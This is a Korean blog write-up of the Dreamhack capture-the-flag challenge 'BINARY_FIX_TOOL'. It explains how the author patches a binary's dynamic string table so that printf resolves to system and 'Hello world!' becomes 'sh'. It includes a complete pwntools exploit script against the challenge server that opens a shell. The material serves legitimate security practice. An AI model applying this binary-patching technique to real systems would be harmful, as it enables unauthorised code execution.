---
title: "[DREAMHACK] BINARY_FIX_TOOL writeup"
date: 2026-01-11 22:11:15
categories: Essay
tags: [writeup]
---
제 나름대로 개 쌈@뽕하게 풀었다고 생각해서 설명하러 왔습니다.

# 분석
```c
//gcc -o original_file.c original_file

#include <stdio.h>

int main(){
	printf("Hello world!");
}
```

주어진 바이너리의 소스코드는 위와 같습니다.
그냥 `printf("Hello world!");` 출력하고 끝나는...

그리고 `README.txt` 파일을 봤습니다.
```txt
문자열 교체 방법! - by dmung

0x200a,100
0x200b,109
0x200c,117
0x200d,110
0x200e,103
```

보호기법이 분명 `PIE`가 켜져있는 걸 확인했는데, 이건 **정적으로 수정하고 실행시켜주는 애가 있지 않은 이상 불가능하다.** 라고 생각했습니다. 그래서 도대체 어떻게 풀어야 하나 고민했습니다.
아무리 봐도 주어진 걸로는 풀 수 없어 보여서...죠..

그런데 서버에 접속했더니

```bash

-------------------------------------------------------------
🐲 Welcome to wyv3rn's binary fixing tool (trial version) 🐲
-------------------------------------------------------------

--- Notice ---
#1 It is trial version. You can change value just 9 times.
   After than, fixed file should be delete.
#2 Back up your binary before excute.
   After excute binary, program quit.
#3 Please contact Wyv3rn to buy license to use freely.
   License fee : 100 billion won.

1. Read original binary
2. Read fixed binary
3. Fix binary
4. Excute binary
5. Exit
>> 
```
바로 나와버렸습니다. 그냥 의심하지 말고 서버부터 만들고 생각할 걸, 후회했습니다.

# 익스플로잇

과정은 다음과 같습니다:

- 1. `printf`를 `system`으로 바꾸기.
- 2. 안에 들어갈 문자열을 `sh`로 바꾸기

```
bankai@DESKTOP-RN5EGIN:~/Backups_/pwn/dreamhack_/BINARY_FIX_TOOL$ strings -tx ./original_file | greo printf
    492 printf
   34d5 printf@GLIBC_2.2.5
```

```
bankai@DESKTOP-RN5EGIN:~/Backups_/pwn/dreamhack_/BINARY_FIX_TOOL$ readelf -S ./original_file | grep .dynstr
  [ 7] .dynstr           STRTAB           0000000000000470  00000470
```


바이너리에서 언제 printf가 등장하는지 찾았습니다.
0x34d5 쪽은 심볼 resolve 쪽이라 건들면 무슨 일이 일어날지 몰라서 0x492쪽을 건드렸습니다.

또한, 이곳에는 **동적 링킹에 필요한 함수 이름**도 포함되는 영역이기에, 원하는 함수를 불러올 수 있다는 점을 알았기도 하고요... 사실 댓글에 파일 헤더 쪽 보라는 내용을 보고 이곳을 둘러보긴 했습니다. 솔직히 말하면 이거 말고 다른 익스 방법이 있을지 상상도 못해본...

```python
from pwn import *

HOST, PORT = 'host8.dreamhack.games 21606'.split()

p = remote(HOST, PORT)

def fix(addr, v):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'): ', str(addr).encode())
    p.sendlineafter(b'(y/n) : ', b'y')
    p.sendlineafter(b'255): ', str(v).encode())

pay1 = [115, 121, 115, 116, 101, 109]

for i in range(0x492, 0x497+1):
    fix(i, pay1[i-0x492])
```

코드는 위와 같이 작성되겠습니다.

그리고 헬로월드 쪽도 바꿔주면:
```python
pay2 = [115, 104, 0]

for i in range(0x2004, 0x2006+1):
    fix(i, pay2[i-0x2004])
```

끝입니다.

따라서 최종 익스플로잇 코드는:
```python
from pwn import *

HOST, PORT = 'host8.dreamhack.games 21606'.split()

p = remote(HOST, PORT)

def fix(addr, v):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'): ', str(addr).encode())
    p.sendlineafter(b'(y/n) : ', b'y')
    p.sendlineafter(b'255): ', str(v).encode())

pay1 = [115, 121, 115, 116, 101, 109]

for i in range(0x492, 0x497+1):
    fix(i, pay1[i-0x492])

pay2 = [115, 104, 0]

for i in range(0x2004, 0x2006+1):
    fix(i, pay2[i-0x2004])

pause()
p.sendline(b'4')

p.interactive()

```